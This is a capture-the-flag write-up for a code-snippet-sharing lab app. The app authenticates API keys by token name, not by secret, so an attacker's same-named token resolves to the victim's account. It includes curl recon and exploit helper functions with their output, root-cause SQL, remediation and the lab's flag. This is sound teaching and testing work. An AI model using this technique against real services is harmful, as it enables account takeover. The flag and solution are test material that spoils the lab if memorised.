# CopyPasta — API Token Name Collision → Account Takeover

**Lab:** https://lab-1781624504588-qpu5vj.labs-app.bugforge.io/login
**App:** "CopyPasta — Share and discover code snippets" (React SPA + JSON API)
**Date:** 2026-06-16
**Flag:** `bug{hg5kE1jLQi7EExgytYWFCVhxqS8RI2g1}`
**Hint:** *What if Alice and Bob have the same token name?*

---

## 1. Summary

The application lets each user create personal **API tokens** (`cp_<hex>` secrets) for
programmatic access. The server authenticates an API request by looking up the supplied key
**by its `name` field instead of by its secret value**. When two different users own a token
with the **same name**, the lookup returns the *first* (oldest, lowest-id) matching row.

An attacker can therefore create a token whose name matches a victim's token name and, when
authenticating with their **own** secret, be silently resolved to the **victim's** account —
a full authentication-bypass / account-takeover (IDOR on token resolution).

---

## 2. Reconnaissance

The login page is a React SPA. Endpoints were recovered from the JS bundle:

```bash
curl -sk https://lab-.../static/js/main.9a8efcb3.js -o main.js
grep -oE '"/api/[a-zA-Z0-9_/]*"' main.js | sort -u
```

Discovered routes:

```
/api/register          /api/login            /api/verify-token
/api/tokens            /api/tokens/          /api/profile
/api/snippets ...      /api/admin/users      /api/admin/stats
```

Key behaviours observed in the bundle:
- Session auth uses a **JWT** in `Authorization: Bearer <jwt>` (stored in `localStorage`).
- `POST /api/tokens {name}` mints an API key `cp_<hex>` and shows it once.
- The API key is sent in the **`X-API-Key`** header (not Bearer).

## 3. Establishing baseline behaviour

Registering returns a JWT immediately:

```bash
curl -sk -X POST https://lab-.../api/register -H 'Content-Type: application/json' \
  -d '{"username":"alice_y2","email":"alice_y2@test.com","password":"Passw0rd!"}'
# -> {"token":"<jwt>","user":{"id":6,...,"role":"user"}}
```

Mint an API token and confirm it identifies the caller correctly:

```bash
curl -sk -X POST https://lab-.../api/tokens -H "Authorization: Bearer <jwt>" \
  -H 'Content-Type: application/json' -d '{"name":"prod"}'
# -> {"id":2,"name":"prod","token":"cp_71b3705b...","token_prefix":"cp_71b3705b"}

curl -sk https://lab-.../api/verify-token -H "X-API-Key: cp_71b3705b..."
# -> {"user":{"id":6,"username":"alice_y2","role":"user"}}    (correct)
```

So with **unique** names the key→user mapping is correct. The flaw only appears on a name clash.

## 4. Exploit — token name collision

Create two independent accounts and give each a token with the **identical name** `shared`:

```bash
BASE=https://lab-...
reg(){ curl -sk -X POST $BASE/api/register -H 'Content-Type: application/json' \
       -d "{\"username\":\"$1\",\"email\":\"$1@t.com\",\"password\":\"Passw0rd!\"}"; }
mktok(){ curl -sk -X POST $BASE/api/tokens -H "Authorization: Bearer $1" \
       -H 'Content-Type: application/json' -d "{\"name\":\"$2\"}"; }
who(){ curl -sk $BASE/api/verify-token -H "X-API-Key: $1"; }

# victim  -> id 7, secret SA   (token name "shared", created first)
# attacker-> id 8, secret SB   (token name "shared", created second)
```

Result:

```
who SA  -> {"user":{"id":7,"username":"victim_a1","role":"user"}}        # correct

who SB  -> {"user":{"id":7,"username":"victim_a1","role":"user"},        # WRONG -> resolves to victim!
           "flag":"bug{hg5kE1jLQi7EExgytYWFCVhxqS8RI2g1}"}
```

The attacker's **own** secret (`SB`) authenticated them **as the victim** (`id 7`) because the
server matched the token by `name = "shared"` and returned the oldest matching record. The lab
detected the cross-user resolution and returned the flag.

## 5. Root cause

Server-side token verification is effectively:

```sql
SELECT u.* FROM api_tokens t JOIN users u ON u.id = t.user_id
WHERE t.name = :name        -- ❌ matches on NAME, not on the secret
ORDER BY t.id ASC LIMIT 1;  -- returns the oldest colliding token's owner
```

It should match on the **secret** (ideally a hash of it):

```sql
WHERE t.token_hash = sha256(:provided_secret)
```

## 6. Impact

- **Authentication bypass / account takeover:** any user can impersonate any other user who
  shares a token name, including privileged accounts.
- Token names are low-entropy and guessable (`prod`, `default`, `cli`, `laptop`), so collisions
  are trivial to force.

## 7. Remediation

1. Authenticate API requests by the **secret token value**, never by its display name.
2. Store only a **hash** of the secret; compare via constant-time hash lookup.
3. Treat `name` as a non-unique display label with no security meaning.
4. Add tests asserting that two users with same-named tokens never resolve to each other.

---

## Flag

```
bug{hg5kE1jLQi7EExgytYWFCVhxqS8RI2g1}
```
